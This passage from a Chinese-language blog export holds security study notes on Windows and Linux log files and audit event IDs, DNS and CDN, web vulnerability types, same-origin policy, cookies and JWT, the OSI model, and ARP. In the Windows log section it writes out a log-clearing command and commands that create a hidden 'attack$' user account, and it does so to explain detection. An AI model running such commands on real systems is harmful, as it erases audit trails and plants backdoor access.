    <url>/2023/06/25/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h1><p><strong>系统日志System.evtx</strong>:记录系统中硬件、软件和系统问题的信息，用户可以通过它来检查错误发生的原因或者寻找受到攻击时攻击者留下的痕迹</p>
<blockquote>
<p>C:\Windows\System32\winevt\Logs\System.evtx</p>
</blockquote>
<p><strong>应用程序日志Application.evtx</strong>：记录程序在运行过程中的日志信息</p>
<blockquote>
<p>..\Application.evtx</p>
</blockquote>
<p><strong>安全日志Security.evtx</strong>：登录日志、对象访问日志、进程追踪日志、特权使用、账号管理、策略变更、系统事件。</p>
<blockquote>
<p>..\Security.evtx</p>
</blockquote>
<h2 id="日志审计策略功能"><a href="#日志审计策略功能" class="headerlink" title="日志审计策略功能"></a>日志审计策略功能</h2><p>win+R—&gt;gpedit.msc</p>
<h2 id="打开系统日志"><a href="#打开系统日志" class="headerlink" title="打开系统日志"></a>打开系统日志</h2><p>win+R—&gt;eventvwr</p>
<h2 id="事件日志分析"><a href="#事件日志分析" class="headerlink" title="事件日志分析"></a>事件日志分析</h2><p>日志清除记录——ID：1102</p>
<blockquote>
<p>清空安全日志（需要有System权限）<br>通过cmd清除：<br>win+R—&gt;wevtutil cl “logname（日志名）”<br>·出站入站记录——ID：5156、5158</p>
</blockquote>
<p>远程连接：</p>
<blockquote>
<p>win+R—&gt;mstsc<br>每一对5156和5158的事件间隔为５ｓ，这是载荷的定时回连操作，目的是keep alive 和get task</p>
</blockquote>
<p>·账户管理记录——ID：4720（可以查找到创建的用户，隐藏的用户也可以查找到）、4726（可以查找到删除的用户）</p>
<blockquote>
<p>添加隐藏用户:net user attack$ Aa123456 &#x2F;add<br>删除隐藏用户:net user attack$ &#x2F;del<br>创建用户组：net logalgroup group1 &#x2F;add<br>查看用户组: net user<br>·安全组管理记录——ID：4732（查看创建的用户加入了哪个组）、4733（查看用户从哪个组中被移除了）</p>
</blockquote>
<p>·账户行为记录——ID：4624、4634、4625</p>
<blockquote>
<p>4624：用户登录<br>4634：用户注销<br>4625：登录失败</p>
</blockquote>
<p>·凭证验证记录——ID：4776</p>
<blockquote>
<p>凭证验证是指，当你要去访问目标主机的FTP、Samba服务时，目标主机会发起验证请求，要求你输入用户名和密码。日志会详细的记录登录者的工作站、登录账户信息。</p>
</blockquote>
<p>·计划任务事件——ID：4698、4699、4700、4701、4702</p>
<blockquote>
<p>在该事件记录信息中，计划任务schtasks以及at都会被记录在内：包括创建者、任务名称、任务内容等。<br>4698：计划任务已创建<br>4700：计划任务已启用<br>4701：计划任务已停用<br>4702：计划任务已变更</p>
</blockquote>
<p>·进程创建及终止记录——ID：4688、4689</p>
<blockquote>
<p>要记录该日志，需要编辑本地审计策略后重启计算机（上面有讲如何开启策略），重启后便可记录每一个被启动的进程日志，包括软件进程。</p>
</blockquote>
<h1 id="2-linux"><a href="#2-linux" class="headerlink" title="2.linux"></a>2.linux</h1><blockquote>
<p>默认日志守护进程为[syslog]。位于&#x2F;usr&#x2F;sbin&#x2F;syslog 或&#x2F;usr&#x2F;sbin&#x2F;syslogd或&#x2F;usr&#x2F;sbin&#x2F;rsyslog.d.默认配置文件为：&#x2F;etc&#x2F;syslog.conf ,&#x2F;etc&#x2F;rsyslog.conf，可以配置生成的日志</p>
</blockquote>
<h2 id="常用日志"><a href="#常用日志" class="headerlink" title="常用日志"></a>常用日志</h2><blockquote>
<ol>
<li>&#x2F;var&#x2F;log&#x2F;messages: 包括整体系统普通信息，其中也包含系统启动期间的日志。此外，还包括mail,cron,daemon,kern,auth等内容.</li>
<li>&#x2F;var&#x2F;log&#x2F;syslog:它上messages日志不同，它只记录警告信息，通常是系统出问题的信息。</li>
<li>&#x2F;var&#x2F;log&#x2F;user.log: 记录所有等级用户信息的日志.</li>
<li>&#x2F;var&#x2F;log&#x2F;auth.log: 包含系统授权信息，用户登陆和使用权限机制</li>
<li>&#x2F;var&#x2F;log&#x2F;daemon.log: 包含各种系统后台守护进程日志信息</li>
<li>&#x2F;var&#x2F;log&#x2F;kern.log: 包含内核产生的日志，有助于在定制内核时解决问题.</li>
<li>&#x2F;var&#x2F;log&#x2F;boot.log: 记录系统在引导过程中发生的事件，即linux系统开机自检过程显示的信息</li>
<li>&#x2F;var&#x2F;log&#x2F;lastlog: 记录最后一次用户成功登陆的时间，IP等信息，lastlog查看</li>
<li>&#x2F;var&#x2F;log&#x2F;secure: linux系统安全日志，记录用户和工作组变坏情况，用户登陆认证情况</li>
<li>&#x2F;var&#x2F;log&#x2F;btmp:记录linux登陆失败的用户，时间和远程IP</li>
<li>&#x2F;var&#x2F;log&#x2F;wtmp:此日志文件永久记录每个用户登录，注销及系统的启动，停机的事件，用last查看</li>
<li>&#x2F;var&#x2F;log&#x2F;utmp:记录有关当前登录的每个用户的信息。如who,w,users,finger等需要访问此文件</li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>windows日志</category>
        <category>linux日志</category>
      </categories>
      <tags>
        <tag>系统日志</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
<blockquote>
<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
</blockquote>
<p>主题优化参照如下：</p>
<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
]]></content>
      <categories>
        <category>博客搭建及其优化</category>
      </categories>
      <tags>
        <tag>博客经验来源</tag>
      </tags>
  </entry>
  <entry>
    <title>知识基础</title>
    <url>/2023/05/13/%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a>1.域名</h2><p>internet上某台计算机或机组的名称</p>
<h3 id="二级域名、多级域名"><a href="#二级域名、多级域名" class="headerlink" title="二级域名、多级域名"></a>二级域名、多级域名</h3><p>国际顶级域名下的二级域名：.microsoft.com</p>
<p>国家顶级域名下的二级域名：.com.cn</p>
<h2 id="2-DNS"><a href="#2-DNS" class="headerlink" title="2.DNS"></a>2.DNS</h2><p>域名系统（Domain Name System）：域名和IP地址相互映射的一个分布式数据库，使用UDP端口53，对每一级域名长度限制是63个字符，域名总长度不超过253个字符</p>
<p>当我们向DNS服务器发起解析域名的请求时，DNS服务器首先会查询自己的缓存中有没有该域名，如果缓存中存在该域名，则可以直接返回IP地址。如果缓存中没有，服务器则会以递归的方式层层访问。</p>
<p>例如：我们要访问<a href="http://www.baidu/">www.baidu</a>. com，首先我们会先向全球13个根服务器发起请求，询问com域名的地址，然后再向负责com域名的名称服务器发送请求，找到baidu.com，这样层层递归，最终找到我们需要的IP地址。</p>
<h3 id="本地HOSTS与DNS关系"><a href="#本地HOSTS与DNS关系" class="headerlink" title="本地HOSTS与DNS关系"></a>本地HOSTS与DNS关系</h3><p>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<br>Hosts地址：C:\Windows\System32\drivers\etc\hosts </p>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h3 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h3><p>Content Delivery Network：构建在网络数据上的分布式内容分发网络，提高系统响应速度，也可以一定程度地拦截攻击。</p>
<p>举例来说，某网站的服务器在A地，E地的用户想要获取服务器的数据，需要跨越很长的距离。这时候的传输速度和路由转发因素，导致访问速度缓慢，所以，如果在E地建立一个CDN服务器，其上缓存了A地服务器的一些数据，那这样的话用户只需访问E地的CDN服务器就能获取相关信息。</p>
<h3 id="CDN工作过程"><a href="#CDN工作过程" class="headerlink" title="CDN工作过程"></a>CDN工作过程</h3><ol>
<li><p>dns请求当地local DNS</p>
</li>
<li><p>当地local DNS递归的查询服务器的gslb（全局负载均衡；CDN系统总是希望用距离用户最近的设备为其提供服务，这也需要在不同地域部署多个节点。GSLB系统就是解决这个问题的。</p>
<p>版权声明：本文为CSDN博主「dahuang1016」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/dahuang1016/article/details/105928932%EF%BC%89">https://blog.csdn.net/dahuang1016/article/details/105928932）</a></p>
</li>
<li><p>服务器根据local DNS 分配最佳节点，返回ip</p>
</li>
<li><p>用户获得最佳接入ip，访问最佳节点。</p>
</li>
<li><p>如果该节点没有用户想要获取的内容，则通过内部路由访问上一节点，直到找到文件或到达源站为止。</p>
</li>
<li><p>cdn节点缓存该数据，下次请求该文件时可以直接返回。</p>
</li>
</ol>
<p>————————————————<br>版权声明：本文为CSDN博主「码上腾飞」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Frankltf/article/details/108820315">https://blog.csdn.net/Frankltf/article/details/108820315</a></p>
<h3 id="CDN与DNS关系"><a href="#CDN与DNS关系" class="headerlink" title="CDN与DNS关系"></a>CDN与DNS关系</h3><p>cdn的就近访问，那就需要知道用户所在位置，好给他分配最优的CDN节点。**&#x3D;&#x3D;所以需要用到DNS定位&#x3D;&#x3D;<strong>。一般的调度方式是，如果调度服务器看到用户使用了E地的LDNS（本地DNS）服务器，</strong>就会认为该用户来自E地**，然后给该用户分配了E地的CDN服务器，让他去访问。</p>
<p>当然了，其缺点在于，A地的用户使用了E地的LDNS的话，被分配的会是E地的CDN。</p>
<p>所以引入了<strong>http调度</strong>。</p>
<p>其原理为：当用户访问我们的服务器时，服务器先分析用户的ip地址，然后服务器给用户返回一个302重定向，将离用户最近的服务器存在location中，用户再去请求这个cdn服务器就能得到最佳的cdn节点。</p>
<p>不足之处在于，其有一次额外的htttp访问，首次访问的延时较高，访问些小文件有点得不偿失。<strong>所以一般是dns先定位，http的方式来调整偏差。</strong></p>
<h3 id="常见DNS攻击"><a href="#常见DNS攻击" class="headerlink" title="常见DNS攻击"></a>常见DNS攻击</h3><ul>
<li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li>
<li>DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广）</li>
<li>域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点）</li>
<li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li>
</ul>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h2 id="3-后门"><a href="#3-后门" class="headerlink" title="3.后门"></a>3.后门</h2><h3 id="后门是什么"><a href="#后门是什么" class="headerlink" title="后门是什么"></a>后门是什么</h3><p>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。<br>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。</p>
<h3 id="后门的意义"><a href="#后门的意义" class="headerlink" title="后门的意义"></a>后门的意义</h3><p>可以更方便的链接到主机；在获取到主机权限的时候，后门可以充当命令控制台的角色 </p>
<p>如果后门进入后遇到文件无权限，换目录</p>
<h2 id="4-WEB"><a href="#4-WEB" class="headerlink" title="4.WEB"></a>4.WEB</h2><h3 id="WEB的组成"><a href="#WEB的组成" class="headerlink" title="WEB的组成"></a>WEB的组成</h3><ul>
<li>网站源码：分脚本类型，分应用方向</li>
<li>操作系统：windows、linux</li>
<li>中间件（搭建平台）：apache iis tomcat nginx 等</li>
<li>数据库：access mysql mssql oracle sybase db2 postsql 等</li>
</ul>
<h3 id="WEB相关漏洞"><a href="#WEB相关漏洞" class="headerlink" title="WEB相关漏洞"></a>WEB相关漏洞</h3><ul>
<li>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li>
<li>WEB 中间件对应漏洞：未授权访问，变量覆盖…</li>
<li>WEB 数据库对应漏洞：弱口令，权限提升…</li>
<li>WEB 系统层对应漏洞：提权，远程代码执行</li>
<li>其他第三方对应漏洞</li>
<li>APP 或 PC 应用结合类</li>
</ul>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h3 id="信息敏感点"><a href="#信息敏感点" class="headerlink" title="信息敏感点"></a>信息敏感点</h3><ul>
<li><p>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</p>
</li>
<li><p>web脚本类型：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</p>
</li>
<li><p>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
</li>
<li><p>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</p>
</li>
</ul>
<h3 id="网站搭建相关知识"><a href="#网站搭建相关知识" class="headerlink" title="网站搭建相关知识"></a>网站搭建相关知识</h3><p>扫描时：域名访问一般只会指向某个目录(子目录)及其内部文件，而IP访问指向根目录，发现的内容更多。</p>
<p>f12网络数据包会有网站的信息（如中间站、系统等）</p>
<h3 id="常见文件后缀解析"><a href="#常见文件后缀解析" class="headerlink" title="常见文件后缀解析"></a>常见文件后缀解析</h3><p>主要是类似于一句话木马的后缀限制，如果不行，就换个后缀，这个原理来自中间件的解析？</p>
<h2 id="5-系统"><a href="#5-系统" class="headerlink" title="5.系统"></a>5.系统</h2><h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><p>windows对大小写不敏感，ping值 ttl128左右；而linux敏感，ping值 ttl64左右</p>
<p>nmap -O ip</p>
<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><ul>
<li>nmap -O ip</li>
<li>nmap ip -p 端口，通过端口开发反推数据库</li>
</ul>
<h4 id="数据库常见漏洞类型与攻击"><a href="#数据库常见漏洞类型与攻击" class="headerlink" title="数据库常见漏洞类型与攻击"></a>数据库常见漏洞类型与攻击</h4><ul>
<li>弱口令</li>
<li>sql注入</li>
</ul>
<h3 id="常见数据库结构"><a href="#常见数据库结构" class="headerlink" title="常见数据库结构"></a>常见数据库结构</h3><ul>
<li>ASP+Access</li>
<li>php+mysql</li>
<li>axpx+mssql</li>
<li>jsp+mssql，oracle</li>
<li>python+mongodb</li>
</ul>
<h3 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h3><ul>
<li>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</li>
<li>NOSQL数据库 –MongoDB:27017 –Redis:6379 -memcached:11211</li>
</ul>
<h2 id="6-同源策略"><a href="#6-同源策略" class="headerlink" title="6.同源策略"></a>6.同源策略</h2><p>为了不让浏览器的页面行为发生混乱，浏览器提出了“Origin”（源）这一概念，来自不同Origin的对象无法互相干扰。</p>
<p>对于JavaScript来说，以下情况被认为是同源与不同源的。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621140001811.png"></p>
<p>影响“源”的因素有：<strong>host</strong>（域名或IP地址，如果是IP地址则看做一个根域名）、<strong>子域名</strong>、<strong>端口</strong>、<strong>协议</strong>。</p>
<p>两个网页具有相同的协议（比如http或https）、主机名和端口号。换句话说，只有<strong>当两个网页的协议、域名和端口完全相同</strong>，它们才被认为是同源的。</p>
<p>对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。</p>
<p>换言之，a.com通过以下代码：</p>
<p><code>&lt;script src=http://b.com/b.js &gt;&lt;/script&gt;</code></p>
<p><img src="/../../../Typora/img111/23410_42_2.jpg" alt="img"></p>
<p>加载了 b.com 上的b.js，但是b.js <strong>是运行在a.com页面中的</strong>，因此对于当前打开的页面（a.com页面）来说，<strong>b.js的Origin 就应该是 a.com 而非 b.com</strong>。</p>
<p>跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”</p>
<h3 id="前端跨域技术"><a href="#前端跨域技术" class="headerlink" title="前端跨域技术"></a>前端跨域技术</h3><p>采取同源策略，浏览器可以有效地限制潜在的跨站点脚本攻击（XSS）和跨站请求伪造（CSRF）等安全威胁。</p>
<p><strong>这样就引出了一个前端跨域技术。</strong></p>
<p>1.JSONP（JSON with Padding）</p>
<blockquote>
<p>JSONP是一种利用&lt;script&gt;标签的跨域技术。通过动态创建一个&lt;script&gt;标签，src属性指向包含回调函数的远程URL，远程服务器将数据包装在回调函数中返回。由于&lt;script&gt;标签不受同源策略的限制，因此可以在不同域之间进行跨域请求。</p>
</blockquote>
<p>2.跨域资源共享（CORS）</p>
<blockquote>
<p>CORS是一种基于HTTP头部的机制，允许服务器声明哪些源被授权访问其资源。通过在服务器端设置响应头部中的Access-Control-Allow-Origin字段，可以允许特定源的请求跨域访问。前端代码在发送请求时<strong>，浏览器会自动在请求头中添加Origin字段</strong>，服务器收到请求后会检查Origin字段，并决定是否允许跨域访问。</p>
</blockquote>
<p>3.代理服务器</p>
<blockquote>
<p>代理服务器是一种将客户端请求转发给目标服务器的中间服务器。</p>
<p>前端应用可以将跨域请求发送到同源的代理服务器上，然后由代理服务器再向目标服务器发送请求，获取响应后再返回给前端应用。通过这种方式，前端应用绕过了浏览器的同源策略限制。</p>
</blockquote>
<p>4.WebSocket</p>
<blockquote>
<p>WebSocket是一种在单个TCP连接上进行全双工通信的协议，可以在不受同源策略限制的情况下进行跨域通信。WebSocket建立的连接不受同源策略的限制，因此可以在不同源之间实现实时通信。</p>
</blockquote>
<h2 id="7-windows命令"><a href="#7-windows命令" class="headerlink" title="7.windows命令"></a>7.windows命令</h2><blockquote>
<p>cd</p>
<p>dir</p>
<p>net 查看网络Window服务,net start </p>
<p>netstat 显示网络连接的信息，包括显示活动的TCP连接、路由器和网络接口信息，是一个监控TCP&#x2F;IP网络非常有用的工具，可以让用户得知系统中目前都有哪些网络连接正常。 netstat &#x2F;?获得帮助</p>
</blockquote>
<h2 id="8-Cookie、Session、token"><a href="#8-Cookie、Session、token" class="headerlink" title="8.Cookie、Session、token"></a>8.Cookie、Session、token</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>Cookie:存在于客户端，保存用户信息；</p>
<p><strong>作用：</strong></p>
<p>会话管理、个性化、追踪(用户行为)</p>
<p><strong>位置：</strong></p>
<p>内存（浏览器维护，浏览器关闭就消失）；硬盘（有过期时间）</p>
<p><strong>格式</strong></p>
<p><code>Set-Cookie: &quot;&lt;name&gt;=&lt;value&gt;[;domain=&lt;domain_name&gt;][;path=&lt;some_path&gt;][;expires=&lt;date&gt;][;&lt;Max-Age&gt;=&lt;age&gt;][;HttpOnly][;secure]&quot;</code></p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>Session:保存于服务端，服务器针对多用户，一个用户对应一个session</p>
<p><strong>作用：跟踪会话</strong></p>
<p><strong>位置</strong></p>
<p>cookie中的sessionid</p>
<p>或url重写</p>
<h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>token:<strong>无状态</strong>，<strong>支持跨域</strong>，有效防御csrf，解决session依赖于单个web服务器问题</p>
<p>是一个全局唯一的字符串，用来唯一识别一个客户端</p>
<p><strong>原理</strong></p>
<p>客户端在账户密码登录之后</p>
<p>服务端接收请求，验证账户密码，成功后，响应一个token</p>
<p>客户端接收到token，每次向服务器请求资源时，就会携带token过去</p>
<p>服务端验证token，有效则返回请求数据</p>
<h4 id="JSON-Web-Token-（JWT）"><a href="#JSON-Web-Token-（JWT）" class="headerlink" title="JSON Web Token （JWT）"></a><strong>JSON Web Token （JWT）</strong></h4><p>通常可以称为 Json 令牌，是<code>RFC 7519</code> 中定义的用于安全的将信息作为 Json 对象进行传输的一种规范，这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息</p>
<p>一个JWT实际上就是一个字符串，它由三部分组成：头部、载荷与签名；<strong>一般针对jwt的攻击是针对载荷。</strong></p>
<p>载荷部分：</p>
<p>一般添加用户的相关信息或其他业务需要的必要信息<br>不建议添加敏感信息，因为该部分在客户端可解密<br>进行base64编码，得到载荷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;iss&quot;: &quot;JWT Builder&quot;, </span><br><span class="line">  &quot;iat&quot;: 1416797419, </span><br><span class="line">  &quot;exp&quot;: 1448333419, </span><br><span class="line">  &quot;aud&quot;: &quot;www.example.com&quot;, </span><br><span class="line">  &quot;sub&quot;: &quot;aaa@example.com&quot;, </span><br><span class="line">  &quot;Email&quot;: &quot;aaa@example.com&quot;, </span><br><span class="line">  &quot;Role&quot;: [ &quot;admin&quot;, &quot;user&quot; ] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>作用</strong></p>
<p>认证、信息交换</p>
<hr>
<h1 id="二、网安"><a href="#二、网安" class="headerlink" title="二、网安"></a>二、网安</h1><h2 id="1-OSI七层模型"><a href="#1-OSI七层模型" class="headerlink" title="1.OSI七层模型"></a>1.OSI七层模型</h2><ol>
<li><p>物理层（Physical Layer）：<strong>将接收到的数据转化为比特流</strong>，主要关注传输媒介、电压、电缆规范、接口等问题。</p>
<p><strong>比特</strong></p>
</li>
<li><p>数据链路层（Data Link Layer）：该层负责将物理层提供的<strong>比特流</strong>划分为数据<strong>帧</strong>，<strong>以便于在本地网络中传输</strong>，<strong>在本地网段上使用硬件地址唯一标识主机</strong>，并检测和纠正传输中的错误。它还处理点对点之间的直接通信，提供链路管理、访问控制和流量控制等功能。</p>
<p><strong>帧</strong></p>
<blockquote>
<p>MAC地址 局域网 分段目标 局部地址</p>
</blockquote>
</li>
<li><p>网络层（Network Layer）：<strong>为传送过来的数据加装IP地址，使得数据段转化为数据包或数据报，用于寻址和路由。指引数据包前进方向。</strong>该层负责在网络中传输数据包，通过确定最佳路径将数据从发送方传输到接收方。它还处理分组的路由选择、分组转发和拥塞控制等任务。</p>
<p><strong>数据报</strong></p>
<blockquote>
<p>协议:IP ICMP</p>
</blockquote>
</li>
<li><p>传输层（Transport Layer）：<strong>提供会话层和网络层之间的传输服务。将会话层数据分段、重组，转化为数据段，提高效率，并在发送方和接收方之间建立一条可靠的连接，确保数据无误传送到网络层。并使用端口号区分应用层的不同应用进程。</strong> 该层提供端到端的数据传输服务，确保可靠的数据传输。它负责分段和重组数据，并提供错误检测和纠正、流量控制、拥塞控制以及端口号标识等功能。</p>
<p><strong>报文段&#x2F;用户数据报</strong></p>
<blockquote>
<p>协议：TCP UDP</p>
</blockquote>
</li>
<li><p>会话层（Session Layer）：<strong>组织和协调两个会话进程之间的通信，并对数据交换进行管理。</strong> 该层建立、管理和终止应用程序之间的会话连接。它提供了会话控制、同步和对话管理功能，允许应用程序之间进行通信和数据交换。</p>
<blockquote>
<p>会话 全双工&#x2F;半双工</p>
</blockquote>
</li>
<li><p>表示层（Presentation Layer）：<strong>对来自应用层的数据进行处理，有格式处理，压缩解压缩，加密解密，编码，目的是使数据快速传递，安全传递。</strong> 该层处理数据的表示方式，确保不同系统中数据的兼容性。它负责数据的加密、压缩、解压缩、格式转换以及数据格式的统一表示。</p>
<p>例如，PC程序与另一台计算机进行通信，其中一台计算机使用扩展二一十进制交换码（EBCDIC），而另一台则使用美国信息交换标准码（ASCII）来表示相同的字符。如有必要，表示层会通过使用一种通格式来实现多种数据格式之间的转换。 　　</p>
</li>
<li><p>应用层（Application Layer）：<strong>用户与各应用程序和网络的接口，直接向用户提供服务，完成用户希望在网络上完成的各种工作。</strong> 该层是最高级别的层次，提供直接面向用户的网络服务。</p>
<blockquote>
<p>它包括各种应用程序协议，例如HTTP（超文本传输协议）、SMTP（简单邮件传输协议）、FTP（文件传输协议）、SMTP(25,TCP)、DNS(53,UDP),Telnet,SSH等。</p>
</blockquote>
</li>
</ol>
<p><img src="/../../../Typora/img111/image-20230613203703899.png"></p>
<p>TCP&#x2F;IP准确来说，第一层应该是网络接口层</p>
<h2 id="2-get与post区别"><a href="#2-get与post区别" class="headerlink" title="2.get与post区别"></a>2.get与post区别</h2><p>HTTP协议中的两种请求方法</p>
<ol>
<li><p>数据位置上，GET请求将数据附加在URL的查询参数中，以?后的键值对形式进行传递；POST在请求体上传递，需要抓包。</p>
</li>
<li><p>数据长度限制：GET请求对数据长度有限制，因为URL有长度限制，不同浏览器和服务器对长度限制的处理方式不同；而POST请求没有严格的数据长度限制。</p>
</li>
<li><p>数据安全性：GET请求中的数据参数会显示在URL中，因此可能被保存在浏览器的历史记录、服务器日志等地方，存在一定的安全风险；POST请求中的数据不会直接显示在URL中，相对更安全。</p>
</li>
<li><p>缓存：GET请求可以被浏览器缓存，以提高性能和效率；POST请求默认不会被浏览器缓存，以确保数据的实时性。</p>
</li>
<li><p>使用场景：GET请求适合获取资源、查询数据，对于幂等的操作。POST请求适合发送数据、提交表单，对于非幂等的操作。</p>
</li>
<li><p>幂等性：GET请求是幂等的，即多次重复请求不会对资源产生影响，只是获取相同的结果；而POST请求通常是非幂等的，多次请求可能会对资源产生不同的影响，例如创建多个资源。</p>
<blockquote>
<p>幂等:指对同一操作的多次重复执行产生的结果与单次执行的结果相同。简而言之，无论执行多少次，最终的效果都是一样的。</p>
</blockquote>
</li>
</ol>
<h2 id="3-Cookies和session的区别"><a href="#3-Cookies和session的区别" class="headerlink" title="3.Cookies和session的区别"></a>3.Cookies和session的区别</h2><ul>
<li><code>Cookie</code> 机制采用的是在客户端保持状态的方案，用来记录用户的一些信息，也是实现 <code>Session</code> 的一种方式</li>
<li><code>Session</code> 机制采用的是在服务器端保持状态的方案，用来跟踪用户的状态，可以保存在集群、数据库、文件中</li>
</ul>
<p>Cookies是在客户端（通常是Web浏览器）上存储数据的小型文本文件。</p>
<p>Session是在服务器端存储数据的一种机制。</p>
<p>区别：</p>
<ol>
<li>存储位置：Cookies存储在客户端（用户的计算机）上，而Session数据存储在服务器端。</li>
<li>数据容量：Cookies通常有大小限制（每个域名和浏览器对Cookies的数量和大小都有限制），而Session可以存储更多的数据。</li>
<li>安全性：由于Cookies存储在客户端，因此它们容易受到篡改和伪造的风险。为了增加安全性，可以对Cookies进行加密或添加安全标志。相比之下，Session数据存储在服务器上，不容易被窃取或篡改，但仍然需要注意保护SessionID的安全性。</li>
<li>生命周期：Cookies可以设置过期时间，可以是会话性的（在浏览器关闭后失效）或持久性的（在特定时间后失效）。Session通常在用户关闭浏览器或一段时间不活动后失效。</li>
</ol>
<h2 id="4-arp协议的工作原理"><a href="#4-arp协议的工作原理" class="headerlink" title="4.arp协议的工作原理"></a>4.arp协议的工作原理</h2><p>将IP地址映射到物理MAC地址的协议，它在局域网中工作。其主要功能是解决在发送数据包时，通过目标IP地址获取对应的MAC地址的问题。</p>
<ol>
<li>主机A发送数据包到目标主机B，但是主机A只知道目标主机B的IP地址。</li>
<li>主机A首先检查本地的ARP缓存表，看是否已经有目标主机B的IP地址对应的MAC地址。如果有，主机A就可以直接使用这个MAC地址。</li>
<li>如果ARP缓存表中没有目标主机B的IP地址对应的MAC地址，主机A就需要发送一个ARP请求广播。ARP请求广播是一个<strong>以太网帧</strong>，包含了源主机A的MAC地址、源主机A的IP地址、目标IP地址（即主机B的IP地址）以及一个特殊的目标MAC地址（广播地址：FF:FF:FF:FF:FF:FF）。</li>
<li>当主机B接收到ARP请求广播后，检查广播中的目标IP地址是否和自己的IP地址匹配。如果匹配，主机B就会发送一个ARP响应给主机A。ARP响应是一个<strong>以太网帧</strong>，包含了源主机B的MAC地址、源主机B的IP地址以及目标主机A的IP地址和MAC地址。</li>
<li>主机A接收到ARP响应后，将目标主机B的IP地址和MAC地址的映射关系存储在本地的ARP缓存表中，以便将来的通信中可以直接使用。</li>
<li>主机A收到目标主机B的MAC地址后，可以构建<strong>以太网帧</strong>，并将数据包发送到目标主机B的MAC地址。</li>
</ol>
<h3 id="问题17：session-的工作原理"><a href="#问题17：session-的工作原理" class="headerlink" title="问题17：session 的工作原理?"></a>问题17：session 的工作原理?</h3><p><strong>答案：</strong></p>
